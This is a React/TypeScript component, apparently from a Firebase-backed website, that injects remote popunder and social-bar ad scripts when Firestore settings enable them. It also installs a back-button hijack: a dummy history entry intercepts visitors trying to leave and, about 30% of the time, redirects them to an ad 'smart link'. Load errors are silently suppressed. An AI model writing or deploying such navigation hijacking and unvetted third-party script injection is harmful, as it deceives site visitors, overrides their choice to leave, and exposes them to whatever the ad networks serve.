import { useEffect, useRef } from 'react';
import { doc, getDoc } from 'firebase/firestore';
import { db } from '../../lib/firebase';

const SOCIAL_BAR_SRC = 'https://pl30417136.effectivecpmnetwork.com/a8/c5/ae/a8c5ae6b95183bffe51c005c71b9acfd.js';
const POPUNDER_SRC = 'https://predestineheadypleasure.com/46/fb/02/46fb02b7663603a5ec0e75ce574d43f4.js';
const SMART_LINK = 'https://predestineheadypleasure.com/wbunjk6rq?key=53693a97cb2d7fe1805610bc89cca2ab';

export function AdInjector() {
  const injected = useRef(false);

  useEffect(() => {
    if (injected.current) return;
    
    let isMounted = true;
    let cleanupHijack: (() => void) | undefined;

    const loadAds = async () => {
      try {
        const docRef = doc(db, 'settings', 'advertisements');
        const snap = await getDoc(docRef);
        
        if (!isMounted) return;
        
        if (snap.exists()) {
          const data = snap.data();
          injected.current = true; // Mark as fetched to avoid duplicate queries
          
          if (data.socialBarEnabled) {
            injectScript(SOCIAL_BAR_SRC);
          }
          if (data.popunderEnabled) {
            injectScript(POPUNDER_SRC);
            cleanupHijack = setupBackButtonHijack();
          }
        } else {
          injected.current = true;
        }
      } catch (e) {
        // Silently ignore errors as per requirements
      }
    };

    const injectScript = (src: string) => {
      // Prevent duplicate injection
      if (document.querySelector(`script[src="${src}"]`)) return;
      const script = document.createElement('script');
      script.src = src;
      script.async = true;
      script.onerror = () => {
        // Silently handle load failure so website continues normally
      };
      document.body.appendChild(script);
    };

    const setupBackButtonHijack = () => {
      try {
        if (!window.sessionStorage.getItem('backButtonHijacked')) {
          window.history.pushState({ hijacked: 'dummy' }, '', window.location.href);
          window.sessionStorage.setItem('backButtonHijacked', 'true');

          const handlePopstate = (e: PopStateEvent) => {
            // Ignore if we are just backing into the dummy state from a deeper SPA page
            if (e.state && e.state.hijacked === 'dummy') {
               return;
            }

            // We are going back PAST the dummy state, meaning they are trying to leave.
            // Trigger the smart link intermittently (e.g., 30% of the time).
            if (Math.random() < 0.3) {
              window.location.replace(SMART_LINK);
            } else {
              // Don't show ad. Since we consumed their back action with our dummy state,
              // we need one more history.back() to actually let them leave the site.
              window.removeEventListener('popstate', handlePopstate);
              window.history.back();
            }
          };

          window.addEventListener('popstate', handlePopstate);
          return () => window.removeEventListener('popstate', handlePopstate);
        }
      } catch (err) {
        return undefined;
      }
      return undefined;
    };

    loadAds();

    return () => {
      isMounted = false;
      if (cleanupHijack) cleanupHijack();
    };
  }, []);

  return null;
}
